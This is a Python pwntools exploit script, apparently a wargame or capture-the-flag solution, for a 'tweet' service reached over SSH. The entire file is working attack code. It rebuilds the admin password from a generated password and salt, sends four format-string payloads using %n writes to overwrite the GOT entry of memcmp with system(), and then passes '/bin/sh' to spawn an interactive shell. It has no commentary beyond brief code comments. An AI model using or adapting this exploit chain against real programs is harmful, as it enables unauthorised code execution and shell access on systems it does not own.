#!/usr/bin/python
import sys
from pwn import *

USERNAME=""
PASSWORD=""
HOST=""
FILE=""
DEBUG=0

# system() @
system_addr = 0xb7e63190
# GOT@memcmp()
memcmp_addr = 0x0804d02c
# shellcode

def connect_remote(username, password, host):
    try:
        s = ssh(host=host, user=username, password=password)
    except:
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s

def calc(up, u, s):
    r = (int(up, 16) ^ ord(u)) - ord(s)
    r = r & 0xff # lower 8 bits
    return "{:02x}".format(r)

def gen_passwd(username, salt, user_passwd):
    username += "\n\x00"
    salt += "\n\x00"
    secretpassword = ""
    for i in range(0, 4):
        temp = user_passwd[i*8:i*8+8]
        secretpassword += calc(temp[6:8], username[i*4], salt[i*4])
        secretpassword += calc(temp[4:6], username[i*4+1], salt[i*4+1])
        secretpassword += calc(temp[2:4], username[i*4+2], salt[i*4+2])
        secretpassword += calc(temp[0:2], username[i*4+3], salt[i*4+3])
    return secretpassword

def send_tweet(shell, payload):
    # Tweet
    shell.recvuntil("Enter Choice:", timeout=1)
    shell.sendline("1")
    shell.recvuntil("Enter tweet data (16 bytes):")
    shell.sendline(payload)
    shell.recvuntil(":(", timeout=1)
    shell.sendline("\n")

def authenticate(shell):
    # Send admin password
    shell.recvuntil("Enter Choice:")
    shell.sendline("3")
    shell.recvuntil("Enter password:")
    shell.sendline(admin)
    # Activate debug mode
    shell.recvuntil("Enter Choice:")
    shell.sendline("6")
    shell.sendline("\n")

if __name__ == "__main__":
    p = connect_remote(USERNAME, PASSWORD, HOST)
    shell = p.run("sh")
    print "PID: %d" % (p.pid)

    username = "a"*14
    salt = "a"*14

    if DEBUG:
        # Start program
        shell.sendline("gdb %s" % FILE)
        shell.recvuntil("gdb-peda$")
        shell.sendline("b *0x080490e5")
        shell.recvuntil("gdb-peda$")
        shell.sendline("b *0x80490ea")
        shell.recvuntil("gdb-peda$")
        shell.sendline("r")
    else:
        shell.sendline(FILE)

    # Send username and salt
    shell.recvuntil("Username:")
    shell.sendline(username)
    shell.recvuntil("Salt:")
    shell.sendline(salt)
    shell.recvuntil("Generated Password:\n")

    # Get generated user password
    user_password = shell.recvline().strip()
    admin = gen_passwd(username, salt, user_password)
    admin = admin.decode("hex")
    shell.sendline("\n")

    # Authenticate (admin + debug mode)
    authenticate(shell)

    # Send tweet (max: 16 bytes so break down into 4 parts)
    payload_part1 = "A" + p32(memcmp_addr) + "%8$139x" + "%8$n"
    payload_part2 = "A" + p32(memcmp_addr+1) + "%8$44x" + "%8$n"
    payload_part3 = "A" + p32(memcmp_addr+2) + "%8$225x" + "%8$n"
    payload_part4 = "A" + p32(memcmp_addr+3) + "%8$178x" + "%8$n"

    send_tweet(shell, payload_part1)
    # DEBUG
    #shell.sendline("\n")
    #shell.recvuntil("gdb-peda$")
    #shell.sendline("c")
    #shell.recvuntil("gdb-peda$")
    #shell.sendline("c")

    send_tweet(shell, payload_part2)
    send_tweet(shell, payload_part3)
    send_tweet(shell, payload_part4)

    # Final part: put "/bin/sh" on stack + call memcmp()
    shell.recvuntil("Enter Choice:")
    shell.sendline("3")
    shell.recvuntil("Enter password:")
    shell.sendline("/bin/sh")

    # Switch to interactive
    shell.interactive()
    shell.close()
